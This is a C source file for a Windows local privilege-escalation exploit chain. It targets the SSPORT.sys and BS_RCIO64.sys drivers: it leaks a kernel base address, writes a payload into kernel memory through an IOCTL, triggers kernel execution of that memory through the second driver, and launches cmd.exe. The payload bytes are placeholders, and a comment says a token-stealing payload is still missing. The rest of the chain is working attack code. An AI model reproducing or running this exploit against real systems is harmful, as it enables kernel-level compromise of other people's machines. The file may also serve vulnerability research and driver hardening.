#include "exploit.h"
#include "leak_utilities.h"

// We need a token stealing payload that is null-byte-free, which I am not going to write right now.
// Oh, and this exploit only works if the NX feature is disabled. Sorry.
unsigned char assembly[] =
{
	0xCC, 0x90, 0xCC, 0x90, 0xCC, 0x90, 0xCC, 0x90, 0xCC, 0x90, 0xCC, 0x90,
	0xCC, 0x90, 0xCC, 0x90, 0xCC, 0x90, 0xCC, 0x90, 0xCC, 0x90, 0xCC, 0x90,
	0xCC, 0x90, 0xCC, 0x90, 0xCC, 0x90, 0xCC, 0x90, 0xCC, 0x90, 0xCC, 0x90,
	0xCC, 0x90, 0xCC, 0x90, 0xCC, 0x90, 0xCC, 0x90, 0xCC, 0x90, 0xCC, 0x90,
	0xCC, 0x90, 0xCC, 0x90, 0xCC, 0x90, 0xCC, 0x90, 0xCC, 0x90, 0xCC, 0x90
};

int main(int argc, char** argv)
{
	unsigned char output[4096];
	HANDLE h_ssport = INVALID_HANDLE_VALUE;
	HANDLE h_biostar = INVALID_HANDLE_VALUE;
	HINSTANCE h_ntdll = (void*)0;
	unsigned long long ssport_base_address = 0ULL;
	unsigned long long kernel_data_address = 0ULL;
	unsigned long bytes_returned = 0UL;
	unsigned char unused = 0;

	memset(output, 0, sizeof(output));

	SetConsoleTitleA("Exploit Chain");

	printf("%s", PREAMBLE);

	// === Obtain Required Handles ===
	h_ssport = CreateFileA("\\\\.\\GLOBALROOT\\Device\\SSPORT", GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	if (h_ssport == INVALID_HANDLE_VALUE)
	{
		printf("[-] Failed to obtain a handle to the \"SSPORT.sys\" device driver. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("[+] Obtained a handle to the \"SSPORT.sys\" device driver. Handle Value: 0x%p", h_ssport);

	h_biostar = CreateFileA("\\\\.\\GLOBALROOT\\Device\\BS_RCIO", GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	if (h_biostar == INVALID_HANDLE_VALUE)
	{
		printf("[-] Failed to obtain a handle to the \"BS_RCIO64.sys\" device driver. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("[+] Obtained a handle to the \"BS_RCIO64.sys\" device driver. Handle Value: 0x%p", h_biostar);
	// === Obtain Required Handles ===

	// === Load ntdll.dll For Dynamic Function Resolving ===
	h_ntdll = LoadLibraryA("C:\\Windows\\System32\\ntdll.dll");
	if (!h_ntdll)
	{
		printf("\n[-] Failed to obtain a handle to \"ntdll.dll\" library. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a handle to the \"ntdll.dll\" library. Handle Value: 0x%p", h_ntdll);
	// === Load ntdll.dll For Dynamic Function Resolving ===

	// === Leak SSPORT.sys Kernel Base Address ===
	ssport_base_address = leak_ssport_base_address(h_ntdll);
	if (!ssport_base_address)
	{
		return 1;
	}
	// === Leak SSPORT.sys Kernel Base Address ===

	kernel_data_address = ssport_base_address + KERNEL_DATA_OFFSET;

	DeviceIoControl(h_ssport, 0x9C402408, output, sizeof(output), output, sizeof(output), &bytes_returned, 0);
	DeviceIoControl(h_ssport, 0x9C402408, assembly, sizeof(assembly), output, sizeof(output), &bytes_returned, 0);
	printf("\n[+] Stored kernel payload in kernel memory. Data Address: 0x%p", (void*)kernel_data_address);

	printf("\n<---------------- | Entering Danger Zone | ---------------->");
	for (int i = 3; i > 0; i--)
	{
		printf("\n[!] Triggering execution of kernel data in %d...", i);
		Sleep(1000);
	}

	DeviceIoControl(h_biostar, 0x226000, &kernel_data_address, 8, output, sizeof(output), &bytes_returned, 0);
	printf("\n[!] Triggered execution of kernel data!\n<---------------- | Leaving Danger Zone | ---------------->\n[+] We won!");

	system("start C:\\Windows\\System32\\cmd.exe");
	unused = getchar();

	return 0;
}